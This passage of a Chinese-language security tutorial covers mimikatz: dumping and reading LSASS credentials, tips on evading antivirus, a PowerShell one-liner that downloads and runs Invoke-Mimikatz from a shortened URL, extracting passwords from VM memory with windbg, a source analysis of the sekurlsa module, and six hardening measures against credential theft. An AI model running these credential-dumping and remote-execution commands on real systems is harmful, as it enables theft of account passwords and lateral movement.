3、在win7下测试只能执行一次，第二次执行电脑会重启，其它系统未测试。
 
成功绕过防护生成了1.bin文件。
实战中把生成的文件下载到本地，然后在版本相同的操作系统使用mimikatz读取。
```

mimikatz\# sekurlsa::minidump 1.bin  
mimikatz\# sekurlsa::loginpasswords full  
```
成功读取到密码hash。


### 免杀 小结

对于无法读出明文的系统，可以尝试在线破解hash获取明文。  
https://www.objectif-securite.ch/en/ophcrack  
http://cracker.offensive-security.com/index.php

> 1、源码级免杀应该是效果比较好的，不过对编程能力、免杀经验要求比较高，不少大佬手头上都有私藏定制的全免杀的mimikatz，很多都是通过源码处理后再编译来免杀的。
> 
> 2、通过修改资源、签名、pe优化修改等方式相对简单一些，不过免杀效果也差了一些，很多时候静态查杀能过，但行为查杀就废了。
> 
> 3、针对powershell来加载或执行mimikatz时，免杀主要针对powershell脚本，免杀效果也很好，不过你在目标机器上怎么执行powershell而不触发杀软行为检测是个问题。
> 
> 4、加载器的免杀效果整体算不错，当然donut是个例外，因为他开源而且知名度比较高，里面特征码被查杀的太厉害，如果稍微修改下源码再编译应该会好很多。
> 
> 5、白名单执行大部分还是使用了将C#程序转为js的方法，静态免杀效果还不错，但白名单最尴尬的是远程调用时杀软都会拦截报警，在2008服务器上你用webshell调用任意程序最新的360都会拦截。

**参考**
防御mimikatz抓取密码的方法:https://zhuanlan.zhihu.com/p/59337564
Bypass LSA Protection：https://xz.aliyun.com/t/6943
防御Mimikatz攻击的方法介:https://www.freebuf.com/articles/network/180869.html
九种姿势运行Mimikatz：https://cloud.tencent.com/developer/article/1171183
Mimikatz的多种攻击方式以及防御方式：http://blog.itpub.net/69946337/viewspace-2658825/
简单几步搞定Mimikatz无文件+免杀：https://www.jianshu.com/p/ed5074f8584b

1.对比这几种方式个人还是喜欢导出lsass进程内存方式来读取密码。
2.也可以用powershell远程加载mimikatz脚本读密码，简单方便。
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
```
##  防御mimikatz的6种方法

由于mimikatz工具太厉害，横向移动必备神器，所以针对mimikatz的加固方法也有不少，这里简单介绍几种。

### 方法1-WDigest禁用缓存

WDigest.dll是在Windows XP操作系统中引入的，当时这个协议设计出来是把明文密码存在lsass里为了http认证的。WDigest的问题是它将密码存储在内存中，并且无论是否使用它，都会将其存储在内存中。

默认在win2008之前是默认启用的。但是在win2008之后的系统上，默认是关闭的。如果在win2008之前的系统上打了KB2871997补丁，那么就可以去启用或者禁用WDigest。

KB2871997补丁下载地址：

```
Windows 7 x86 https://download.microsoft.com/download/9/8/7/9870AA0C-BA2F-4FD0-8F1C-F469CCA2C3FD/Windows6.1-KB2871997-v2-x86.msu
Windows 7 x64 https://download.microsoft.com/download/C/7/7/C77BDB45-54E4-485E-82EB-2F424113AA12/Windows6.1-KB2871997-v2-x64.msu
Windows Server 2008 R2 x64 Edition https://download.microsoft.com/download/E/E/6/EE61BDFF-E2EA-41A9-AC03-CEBC88972337/Windows6.1-KB2871997-v2-x64.msu
```

启用或者禁用WDigest修改注册表位置:

HKEY\_LOCAL\_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest

UseLogonCredential 值设置为 0, WDigest不把凭证缓存在内存，mimiktaz抓不到明文；UseLogonCredential 值设置为 1, WDigest把凭证缓存在内存，mimiktaz可以获取到明文。

在注册表中将UseLogonCredential 值设置为 0，或者使用命令

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

我们可以通过如下命令来测试修改是否生效：

reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential

如果成功，系统应该会返回如下内容：

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

注销后重新登录，发现mimikatz已经无法获取明文密码。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法2-Debug 权限

Mimikatz在获取密码时需要有本地管理员权限，因为它需要与lsass进程所交互，需要有调试权限来调试进程，默认情况下本地管理员拥有调试权限，但是这个权限一般情况是很少用得到的，所以可以通过关闭debug权限的方法来防范Mimikatz。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

删除上图的administrators组，这样管理员也没了debug权限。

注销后再执行mimiktaz，获取debug权限时发现报错。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法3-LSA 保护

自Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 sekurlsa::logonpasswords抓取密码会报错。

可以通过注册表开启LSA Protection，注册表位置：HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa新建-DWORD（32）值，名称为 RunAsPPL,数值为 00000001，然后重启系统生效。

或者使用命令来完成

```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "00000001" /f
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

重启后再执行mimikatz.exe，发现已经无法获取密码。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

此时其实可以从磁盘上的SAM读取凭据，执行

```
mimikatz # privilege::debug
mimikatz # token::whoami
mimikatz # token::elevate
mimikatz # lsadump::sam
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法4-受限制的管理模式

对于 Windows 2012 R2 和 Windows 8.1 之前的旧操作系统，需要先安装补丁KB2871997。

先在 HKEY\_LOCAL\_MACHINE\\System\\CurrentControlSet\\Control\\Lsa 设置RunAsPPL为1然后在 HKEY\_LOCAL\_MACHINE\\System\\CurrentControlSet\\Control\\Lsa 设置 DisableRestrictedAdmin为0 , DisableRestrictedAdminOutboundCreds为1。

然后需要在域中强制执行“对远程服务器的凭据限制委派”策略,以确保所有出站RDP会话都使用“RestrictedAdmin”模式,因此才不会泄露凭据。

具体位置是组策略：计算机配置–管理模板–系统–凭据分配–限制向远程服务器分配凭据，选择已启用，但是我的环境里选项一栏中没有看到Require Restricted Admin。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

在执行 lsadump::cache时报错，ERROR kuhl\_m\_lsadump\_secrets0rCache:kull\_m\_registry\_RegOpenKeyEx (SECURITY) 0×00000005该错误，是注册表增加了LSA保护所起到的。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法5-禁用凭证缓存

Domain Cached Credentials 简称 DDC，也叫 mscache。有两个版本，XP/2003 年代的叫第一代，Vasta/2008 之后的是第二代。如果域控制器不可用，那么windows将检查缓存的最后一个密码hash值，这样为以后系统对用户进行身份验证。缓存位置如下：

```
HKEY_LOCAL_MACHINE\SECURITY\Cache
```

在组策略中设置禁用缓存

```
计算机配置--windows设置--安全设置--本地策略--安全选项 交互式登录：之前登录到缓存的次数（域控制器不可用时） 默认是10，设置为0
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

注销后再次执行mimikatz，没有读取到任何用户数据。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

### 方法6-受保护的用户组

WindowsServer 2012及更高版本使用了引入了一个名为“Protected Users”的新安全组，其他系统需要安装 KB2871997 补丁才会有。

此组使域管理员能够保护本地管理员等有权限的用户,因为属于该组的任何帐户只能通过Kerberos对域进行身份验证。

这将有助于防止NTLS密码哈希值或LSAS中的纯文本凭据泄露给敏感帐户,这些帐户通常是攻击者的目标。

可以在“Active Directory用户和计算机”中找到“Protected Users”安全组。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

在配置之前，使用mimikatz可读取明文密码。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

可以通过执行以下PowerShell命令将帐户添加到“受保护的用户”组中:

```
Add-ADGroupMember –Identity 'Protected Users' –Members administrator
```

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

注销后再次执行mimikatz，已经看不到administrator用户的密码了。

![](https://www.freebuf.com/buf/themes/freebuf/_v_s/grey.gif)

## 用Mimikatz提取虚拟机内存中的密码
利用windbg载入Mimikatz读取虚拟机内存文件（vmem/vmsn文件），从而获取到其中的密码。之前也有人单独介绍过Mimikatz和metasploit的Mimikatz模块，这次我们主要说一下windbg是怎样使用Mimikatz进行内存取证的。下面我们来看一下carnal0wnage是怎样做的。  

**题外话：**

为了让大家看的更明白，这里我们先简单说一下Mimikatz：该神器可以直接获取到大多数windows平台下的明文密码，相比于其他工具，最大的特点是速度极快，无需等待。**关于神器用法这里**：[http://www.freebuf.com/tools/37162.html](http://www.freebuf.com/tools/37162.html)原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算

废话不多说，现在我们看下carnal0wnage是如何做的：（前面的我就不写了，大约是carnal0wnage的一些个人感慨。。我个人对别人的私生活私感想没兴趣=。=）
在做这些之前，你需要一些工具：

**Windows调试工具（windbg，研究的主要角色）**

[http://www.remkoweijnen.nl/blog/2013/06/13/debugging-tools-for-windows-direct-download/](http://www.remkoweijnen.nl/blog/2013/06/13/debugging-tools-for-windows-direct-download/)  
[http://blog.gentilkiwi.com/programmes/windbg](http://blog.gentilkiwi.com/programmes/windbg)

**Windows内存内核工具**

[http://www.moonsols.com/windows-memory-toolkit/](http://www.moonsols.com/windows-memory-toolkit/)  

**最新版本的mimikatz已经支持windbg的调用：**

[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)  

**当在vCenter/ESXi系统上做这些研究时，我先贴出一些关于这个问题的一些博客文章：**

[http://www.remkoweijnen.nl/blog/2013/11/25/dumping-passwords-in-a-vmware-vmem-file/](http://www.remkoweijnen.nl/blog/2013/11/25/dumping-passwords-in-a-vmware-vmem-file/)  
[http://blog.gentilkiwi.com/securite/mimikatz/windbg-extension](http://blog.gentilkiwi.com/securite/mimikatz/windbg-extension)  
[http://vniklas.djungeln.se/2013/11/29/password-dump-from-a-hyper-v-virtual-machines-memory/](http://vniklas.djungeln.se/2013/11/29/password-dump-from-a-hyper-v-virtual-machines-memory/)

**下面我们开始：**

### 1 从虚拟主机中拷贝出虚拟内存文件（vmem/vmsn）

### 2 使用moonsols的bin2dmp将内存文件转换为dmp格式文件（这里我用的是之前的付过费的pro版）

```
C:\\Users\\user\\Desktop>Bin2Dmp.exe "Windows Server 2008 x64-b2afd86a.vmem" win2k8.dmp
  bin2dmp - v2.1.0.20140115 Convert raw memory dump _v_s into Microsoft crash dump files. Copyright (C) 2007 - 2014, Matthieu Suiche 
  Copyright (C) 2012 - 2014, MoonSols Limited Initializing memory descriptors... Done.  Directory Table Base is 0x124000  Looking for Kernel Base...  Looking for kernel variables... Done.  Loading file... Done. nt!KiProcessorBlock.Prcb.Context = 0xFFFFF80001B797A0 stuff happens\[0x0000000040000000 of 0x0000000040000000\]    \[0x000000001DAFE000 of 0x000000 MD5=E8C2F318FA528285281C21B3141E7C51 Total time for the conversion: 0 minutes 14 seconds.
```
到这，你应该可以获取到一个dmp文件了，我们可以进行下一步工作了。

### 3 在windbg中载入dmp文件，下面是图片:**

[![](_v_images/20200520174706204_29159.png!small "2.png")](https://.3001.net/_v_s/20140927/14117937738900.png)

[![](_v_images/20200520174705709_32524.png!small "3.png")](https://.3001.net/_v_s/20140927/14117937802653.png)

**注意：**我们要先在windbg控制台中运行.symfix，然后执行.reload

```
kd> .symfix
kd> .reload Loading Kernel Symbols  ...............................................................  ................................................................  .....  Loading User Symbols  Loadingunloaded module list ....
```

### 4 windbg中载入mimilib模块**

```
kd> .load C:\\users\\user\\desktop\\mimilib.dll
  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (May 25 2014 21:48:13) .## ^ ##.  Windows build 6002 ## / \ ##  /* * * ## \ / ##   Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com ) '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo) '#####'                                  WinDBG extension ! * * */  ===================================  #         * Kernel mode *         #  ===================================  # Search for LSASS process  0: kd> !process 0 0 lsass.exe # Then switch to its context  0: kd> .process /r /p # And finally :  0: kd> !mimikatz ===================================  #          * User mode *          #  ===================================  0:000> !mimikatz ===================================

```
### 5 查找lsass进程**  

```
kd> !process 0 0 lsass.exe
PROCESS fffffa800dba26d0
    SessionId: 0  Cid: 023c    Peb: 7fffffd4000  ParentCid: 01e4 DirBase: 2e89f000  ObjectTable: fffff880056562c0  HandleCount: 1092. Image: lsass.exe

```
### 6 将镜像lsass环境转换到本机中**

```
kd> .process /r /p fffffa800dba26d0 Implicit process is now fffffa80`0dba26d0
Loading User Symbols
................................................................
......................
```

### 7 载入mimikatz**
```

kd> !mimikatz Authentication Id : 0 ; 996 (00000000:000003e4)  Session           : Service from 0  User Name         : WIN-3C4WXGGN8QE$ Domain            : UNLUCKYCOMPANY
SID               : S-1-5-20 msv: \[00000002\] Primary * Username : WIN-3C4WXGGN8QE$
  * Domain   : UNLUCKYCOMPANY
  * NTLM     : ea2ed0b14406a168791adf5aee78fd0b
  * SHA1     : ab7bd2f6a64cf857c9d69dd65916622e3dc25424
 tspkg :KO \-\-\-SNIP\-\-\-  Authentication Id : 0 ; 173319 (00000000:0002a507)  Session           : Interactive from 1  User Name         : Administrator  Domain            : UNLUCKYCOMPANY
SID               : S-1-5-21-2086621178-2413078777-1398328459-500 msv: \[00000002\] Primary * Username : Administrator * Domain   : UNLUCKYCOMPANY
  * LM       : e52cac67419a9a2238f10713b629b565
  * NTLM     : 64f12cddaa88057e06a81b54e73b949b * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
 tspkg : * Username : Administrator * Domain   : UNLUCKYCOMPANY
  * Password : Password1 wdigest: * Username : Administrator * Domain   : UNLUCKYCOMPANY
  * Password : Password1 kerberos: * Username : Administrator * Domain   : UNLUCKYCOMPANY.NET
  * Password : Password1 * Key List  \-\-\-SNIP\-\-\-
```

Okay，这样我们就获取到了内存中的密码，明文的。

## Mimikatz源码分析

Mimikatz提取用户凭证功能，其主要集中在sekurlsa模块，该模块又包含很多子模块，如msv,wdigest,kerberos等，使用这些子模块可以提取相应的用户凭证，如sekurlsa::wdigest提取用户密码明文，sekurlsa::kerberos提取域账户凭证，sekurlsa::msv提取ntlm hash凭证，在kuhl\_m\_c_sekurlsa这个数组里面有各个子模块功能的注释，如下：

![15833049322348](_v_images/20200520155410968_3464.png =1000x)

Mimikatz使用了一个的框架，来处理对内存的操作。以wdigest子模块为例，如果在目标机器上运行mimikatz，会跨进程读取读取lsass.exe进程的wdigest.dll模块的数据，如果是用dump文件方式提取密码则是直接打开文件。

 [![.png](_v_images/20200520154956671_1265.png!small =1000x)](https://.3001.net/_v_s/20200304/1583304941438.png)

### 获取用户凭证信息

通过遍历加载的DLL模块名称，来初始化Mimikatz关注的一些DLL的统计信息结构体。

[![.png](_v_images/20200520154953460_31539.png!small =1000x)](https://.3001.net/_v_s/20200304/1583304962404.png)

重点是第二步和第三步。

第二步调用了kuhl\_m\_sekurlsa\_utils\_search继而调用kuhl\_m\_sekurlsa\_utils\_search_generic如下，

[![.png](_v_images/20200520154949651_14318.png!small =1000x)](https://.3001.net/_v_s/20200304/15833049759619.png)

搜索的是LsaSrv.dll的特征码，结合偏移量找到所有的登录会话信息。

[![.png](_v_images/20200520154949144_15935.png!small =1000x)](https://.3001.net/_v_s/20200304/15833049854120.png)

最后打印出来的会话信息

 [![.png](_v_images/20200520154948435_14432.png!small =1000x)](https://.3001.net/_v_s/20200304/15833049944353.png) 
### 获取加密用户密码的密钥

第三步调用了lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages\[0\]->Module.Informations);，实际对于NT6系统实际调用的是kuhl\_m\_sekurlsa\_nt6\_acquireKeys

[![.png](_v_images/20200520154947027_30157.png!small =1000x)](https://.3001.net/_v_s/20200304/15833050097309.png)

用PTRN\_WALL\_LsaInitializeProtectedMemory_KEY作为特征码进行搜索

[![.png](_v_images/20200520154946518_20191.png!small =1000x)](https://.3001.net/_v_s/20200304/15833050347292.png)

获取初始化向量和密钥本身

[![.png](_v_images/20200520154945910_1349.png!small =1000x)](https://.3001.net/_v_s/20200304/15833050495087.png)

### 解密账户密码

基于2.1得到的登录会话信息（包含加密后的用户密码）和2.2得到的加密密钥和初始化向量，mimikatz的wdigest子模块便可以提取用户密码明文。

[![.png](_v_images/20200520154943402_6099.png!small =1000x)](https://.3001.net/_v_s/20200304/15833050667155.png)

kuhl\_m\_sekurlsa\_genericCredsOutput实际调用kuhl\_m\_sekurlsa\_nt6_LsaEncryptMemory进行密码的密文解密。

[![.png](_v_images/20200520154940688_14163.png!small =1000x)](https://.3001.net/_v_s/20200304/15833050827750.png)

最后根据密文长度是否是8的倍数，来调用Aes解密和Des解密（BCryptDecrypt）。
